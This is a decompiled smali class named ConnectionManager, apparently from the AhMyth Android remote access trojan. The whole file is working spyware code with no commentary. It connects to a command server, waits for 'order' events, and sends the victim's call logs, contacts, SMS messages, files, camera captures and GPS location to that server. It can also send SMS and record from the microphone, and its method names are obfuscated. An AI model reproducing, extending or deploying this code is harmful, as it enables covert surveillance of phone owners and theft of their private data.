.class public Lahmyth/mine/king/ahmyth/ConnectionManager;
.super Ljava/lang/Object;
.source ""


# static fields
.field public static a:Landroid/content/Context;

.field private static b:Lb/a/b/e;

.field private static c:Lahmyth/mine/king/ahmyth/d;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lahmyth/mine/king/ahmyth/d;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/d;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->c:Lahmyth/mine/king/ahmyth/d;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a()Lb/a/b/e;
    .locals 1

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    return-object v0
.end method

.method private static b()V
    .locals 3

    :try_start_0
    const-string v0, "android.app.ActivityThread"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Class;

    const-string v2, "currentApplication"

    invoke-virtual {v0, v2, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/Context;

    if-nez v1, :cond_0

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$a;

    invoke-direct {v2, v0}, Lahmyth/mine/king/ahmyth/ConnectionManager$a;-><init>(Ljava/lang/reflect/Method;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0

    :cond_0
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :catch_0
    :goto_0
    return-void
.end method

.method public static sendReq()V
    .locals 3

    :try_start_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/e;->a()Lahmyth/mine/king/ahmyth/e;

    move-result-object v0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/e;->b()Lb/a/b/e;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    const-string v1, "ping"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$b;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$b;-><init>()V

    invoke-virtual {v0, v1, v2}, Lb/a/c/a;->e(Ljava/lang/String;Lb/a/c/a$a;)Lb/a/c/a;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    const-string v1, "order"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$c;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$c;-><init>()V

    invoke-virtual {v0, v1, v2}, Lb/a/c/a;->e(Ljava/lang/String;Lb/a/c/a$a;)Lb/a/c/a;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    invoke-virtual {v0}, Lb/a/b/e;->w()Lb/a/b/e;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "error"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 0

    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :goto_0
    return-void
.end method

.method public static startContext()V
    .locals 0

    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->b()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static x0000ca(I)V
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x1

    const/4 v2, -0x1

    if-ne p0, v2, :cond_0

    new-instance p0, Lahmyth/mine/king/ahmyth/b;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {p0, v2}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/b;->c()Lorg/json/JSONObject;

    move-result-object p0

    if-eqz p0, :cond_2

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p0, v1, v0

    const-string p0, "x0000ca"

    invoke-virtual {v2, p0, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    goto :goto_0

    :cond_0
    if-ne p0, v1, :cond_1

    new-instance p0, Lahmyth/mine/king/ahmyth/b;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/b;->f(I)V

    goto :goto_0

    :cond_1
    if-nez p0, :cond_2

    new-instance p0, Lahmyth/mine/king/ahmyth/b;

    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {p0, v1}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/b;->f(I)V

    :cond_2
    :goto_0
    return-void
.end method

.method public static x0000cl()V
    .locals 4

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/a;->a()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cl"

    invoke-virtual {v0, v2, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    return-void
.end method

.method public static x0000cn()V
    .locals 4

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/c;->a()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cn"

    invoke-virtual {v0, v2, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 2

    const/4 v0, 0x1

    if-nez p0, :cond_0

    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/d;->b(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    aput-object p1, v0, v1

    const-string p1, "x0000fm"

    invoke-virtual {p0, p1, v0}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    goto :goto_0

    :cond_0
    if-ne p0, v0, :cond_1

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/d;->a(Ljava/lang/String;)V

    :cond_1
    :goto_0
    return-void
.end method

.method public static x0000lm()V
    .locals 10

    invoke-static {}, Landroid/os/Looper;->prepare()V

    new-instance v0, Lahmyth/mine/king/ahmyth/f;

    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/f;-><init>(Landroid/content/Context;)V

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->a()Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    const-string v5, "enable"

    if-eqz v2, :cond_0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->b()D

    move-result-wide v6

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->d()D

    move-result-wide v8

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v2, "   ,  "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "loc"

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v0, "lat"

    invoke-virtual {v1, v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v0, "lng"

    invoke-virtual {v1, v0, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    goto :goto_0

    :cond_0
    invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    :goto_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    new-array v2, v3, [Ljava/lang/Object;

    aput-object v1, v2, v4

    const-string v1, "x0000lm"

    invoke-virtual {v0, v1, v2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    return-void
.end method

.method public static x0000mc(I)V
    .locals 0

    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->c(I)V

    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 3

    const/4 v0, 0x0

    const-string v1, "x0000sm"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    new-array p1, v2, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/h;->a()Lorg/json/JSONObject;

    move-result-object p2

    aput-object p2, p1, v0

    invoke-virtual {p0, v1, p1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    goto :goto_0

    :cond_0
    if-ne p0, v2, :cond_1

    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/h;->b(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p0

    sget-object p1, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;

    new-array p2, v2, [Ljava/lang/Object;

    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    aput-object p0, p2, v0

    invoke-virtual {p1, v1, p2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    :cond_1
    :goto_0
    return-void
.end method
